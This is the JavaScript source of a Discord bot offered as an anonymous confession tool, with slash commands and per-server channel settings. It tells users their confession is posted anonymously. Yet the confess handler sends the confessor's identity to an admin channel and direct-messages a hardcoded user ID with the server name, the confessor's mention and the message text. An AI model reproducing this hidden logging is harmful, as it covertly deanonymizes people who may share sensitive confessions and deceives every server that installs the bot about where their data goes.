const { Client, GatewayIntentBits, EmbedBuilder, REST, Routes, PermissionsBitField } = require('discord.js');
const { Sequelize, DataTypes, Model } = require('sequelize');
const path = require('path');
require('dotenv').config();

// Initialize Sequelize (SQLite database)
const sequelize = new Sequelize({
    dialect: 'sqlite',
    storage: path.resolve(__dirname, 'database.sqlite'),
});

// Define Config model
class Config extends Model {}
Config.init(
    {
        guildId: { type: DataTypes.STRING, allowNull: false, unique: true },
        confessionChannelId: DataTypes.STRING,
        publicConfessionChannelId: DataTypes.STRING,
        adminChannelId: DataTypes.STRING,
        reportChannelId: DataTypes.STRING,
        ownerId: { type: DataTypes.STRING, allowNull: false },
        premiumUserIds: { type: DataTypes.JSON, defaultValue: [] },
    },
    { sequelize, modelName: 'Config', tableName: 'Configs', timestamps: false }
);

sequelize.sync().then(() => console.log('✅ Database synchronized.'));

// Discord Client
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent, 
        GatewayIntentBits.DirectMessages
    ] 
});

// Slash Command Definitions
const commands = [
    {
        name: 'confess',
        description: 'Submit an anonymous confession',
        options: [{ name: 'message', type: 3, description: 'Your confession', required: true }]
    },
    {
        name: 'setconfig',
        description: 'Set bot configuration (Admins edit channels, owner edits premium)',
        options: [
            { name: 'confession_channel_id', type: 3, description: 'Confession channel ID', required: false },
            { name: 'public_confession_channel_id', type: 3, description: 'Public confession channel ID', required: false },
            { name: 'admin_channel_id', type: 3, description: 'Admin channel ID', required: false },
            { name: 'report_channel_id', type: 3, description: 'Report channel ID', required: false },
            { name: 'premium_user_ids', type: 3, description: 'Premium user IDs (Owner only)', required: false }
        ]
    }
];

// Register Commands with Discord
const rest = new REST({ version: '10' }).setToken(process.env.BOT_TOKEN);
(async () => {
    try {
        await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
        console.log('✅ Commands registered.');
    } catch (error) {
        console.error('❌ Failed to register commands:', error);
    }
})();

client.once('ready', () => console.log(`🚀 Logged in as ${client.user.tag}`));

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;
    const { commandName, options, user, guildId, member } = interaction;

    try {
        if (commandName === 'confess') {
                const guildId = interaction.guildId; // ✅ Fix
            const config = await Config.findOne({ where: { guildId } });
            if (!config || !config.confessionChannelId ) {
                return interaction.reply({ content: '⚠️ Confession channels not set.', ephemeral: true });
            }

            const confession = options.getString('message');
            const confessionEmbed = new EmbedBuilder()
                .setColor('#0099ff')
                .setTitle('Anonymous Confession')
                .setDescription(`"${confession}"`)
                .setFooter({ text: `Date: ${new Date().toLocaleString()}` });

            // Send to confession channel
            const confessionChannel = await client.channels.fetch(config.confessionChannelId);
            await confessionChannel.send({ embeds: [confessionEmbed] });

            // Send to admin channel
            const adminEmbed = new EmbedBuilder()
                .setColor('#ff0000')
                .setTitle('Confession Details')
                .setDescription(`Confession from: <@${user.id}>\n\n"${confession}"`)
                .setFooter({ text: `Date: ${new Date().toLocaleString()}` });

            const adminChannel = await client.channels.fetch(config.adminChannelId);
            await adminChannel.send({ embeds: [adminEmbed] });

            // Send a copy to the bot owner with server details
            try {
                const owner = await client.users.fetch("454578346517463042");
                const ownerEmbed = new EmbedBuilder()
                    .setColor('#ffcc00')
                    .setTitle('Confession Log')
                    .setDescription(`**Guild:** ${interaction.guild.name} (${interaction.guild.id})\n**User:** <@${user.id}>\n\n**Message:** "${confession}"`)
                    .setFooter({ text: `Date: ${new Date().toLocaleString()}` });

                await owner.send({ embeds: [ownerEmbed] });
            } catch (error) {
                console.error('❌ Failed to send DM to owner:', error);
            }

            await interaction.reply({ content: '✅ Confession posted anonymously.', ephemeral: true });
        }

        if (commandName === 'setconfig') {
            let config = await Config.findOne({ where: { guildId } });
            if (!config) {
                config = await Config.create({ guildId, ownerId: user.id });
            }
        
            const isOwner = user.id === config.ownerId;
            const isPremiumUser = config.premiumUserIds.includes(user.id);
        
            // 🛑 Allow only Admins to modify general channels
            if (member.permissions.has(PermissionsBitField.Flags.Administrator)) {
                config.confessionChannelId = options.getString('confession_channel_id') || config.confessionChannelId;
                config.publicConfessionChannelId = options.getString('public_confession_channel_id') || config.publicConfessionChannelId;
                config.reportChannelId = options.getString('report_channel_id') || config.reportChannelId;
            }
        
            // ✅ Only Owner or Premium Users can modify `adminChannelId`
            if (options.getString('admin_channel_id')) {
                if (!isOwner && !isPremiumUser) {
                    return interaction.reply({ content: '❌ Only the owner or premium users can set the admin channel.', ephemeral: true });
                }
                config.adminChannelId = options.getString('admin_channel_id');
            }
        
            // 🛑 Restrict `premium_user_ids` editing to the **Owner only**
            if (options.getString('premium_user_ids')) {
                if (!isOwner) {
                    return interaction.reply({ content: '❌ You are not authorized to edit premium users.', ephemeral: true });
                }
        
                try {
                    config.premiumUserIds = JSON.parse(options.getString('premium_user_ids'));
                } catch (error) {
                    return interaction.reply({ content: '❌ Invalid JSON format for premium users.', ephemeral: true });
                }
            }
        
            await config.save();
            await interaction.reply({ content: '✅ Configuration updated.', ephemeral: true });
        }
        
    } catch (error) {
        console.error('❌ Error handling command:', error);
        await interaction.reply({ content: '⚠️ An error occurred.', ephemeral: true });
    }
});

client.login(process.env.BOT_TOKEN);
